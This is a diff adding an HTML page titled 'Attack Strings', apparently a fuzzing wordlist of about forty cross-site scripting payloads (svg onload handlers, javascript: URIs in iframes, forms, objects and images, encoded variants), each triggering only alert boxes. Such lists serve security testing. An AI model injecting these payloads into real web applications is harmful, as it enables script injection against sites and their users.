@@ -1,0 +1,45 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Attack Strings</title>
+</head><body>#TODO make sure these are already included in other lists fuzzdb/seclists/etc<br/>
+svg onload=“alert(1)”<br/>
+&lt;svg onload=“alert(1)”&gt;<br/>
+&lt;svg onload=alert(1)&gt;<br/>
+&gt;&lt;svg onload=“alert(1)”&gt;<br/>
+”&gt;&lt;svg onload=alert(1)&gt;<br/>
+”&gt;&lt;svg onload=“alert(1)”&gt;<br/>
+/”&gt;&lt;svg onload=alert(1)&gt;<br/>
+\’-alert(1)//<br/>
+’-alert(1)-‘<br/>
+&lt;/script&gt;&lt;svg onload=alert(1)&gt;<br/>
+” onmouseover=alert(1)//<br/>
+&lt;script&gt;alert(1)&lt;/script&gt;<br/>
+&lt;script src=javascript:alert(1)&gt;<br/>
+&lt;iframe src=javascript:alert(1)&gt;<br/>
+&lt;embed src=javascript:alert(1)&gt;<br/>
+&lt;a href=javascript:alert(1)&gt;click<br/>
+&lt;math&gt;&lt;brute href=javascript:alert(1)&gt;click<br/>
+&lt;form action=javascript:alert(1)&gt;&lt;input type=submit&gt;<br/>
+&lt;isindex action=javascript:alert(1) type=submit value=click&gt;<br/>
+&lt;form&gt;&lt;button formaction=javascript:alert(1)&gt;click<br/>
+&lt;form&gt;&lt;input formaction=javascript:alert(1) type=submit value=click&gt;<br/>
+&lt;form&gt;&lt;input formaction=javascript:alert(1) type=image value=click&gt;<br/>
+&lt;form&gt;&lt;input formaction=javascript:alert(1) type=image src=http://brutelogic.com.br/webgun/img/youtube1.jpg&gt;<br/>
+&lt;isindex formaction=javascript:alert(1) type=submit value=click&gt;<br/>
+&lt;object data=javascript:alert(1)&gt;<br/>
+&lt;iframe srcdoc=%26lt;svg/o%26%23x6Eload%26equals;alert%26lpar;1)%26gt;&gt;<br/>
+&lt;svg&gt;&lt;script xlink:href=data:,alert(1)&gt;&lt;/script&gt;<br/>
+&lt;svg&gt;&lt;script xlink:href=data:,alert(1) /&gt;<br/>
+&lt;math&gt;&lt;brute xlink:href=javascript:alert(1)&gt;click<br/>
+&lt;svg&gt;&lt;a xmlns:xlink=http://www.w3.org/1999/xlink xlink:href=?&gt;&lt;circle r=400 /&gt;&lt;animate attributeName=xlink:href begin=0 from=javascript:alert(1) to=%26&gt;<br/>
+&lt;IMG SRC="javascript:alert('XSS');"&gt;<br/>
+&lt;IMG SRC=javascript:alert('XSS')&gt;<br/>
+&lt;IMG SRC=JaVaScRiPt:alert('XSS')&gt;<br/>
+&lt;IMG SRC=javascript:alert("XSS")&gt;<br/>
+&lt;IMG onmouseover="alert('xxs')"&gt;<br/>
+&lt;a onmouseover="alert(2)"&gt;d&lt;/a&gt;<br/>
+<br/>
+<br/>
+</body></html>
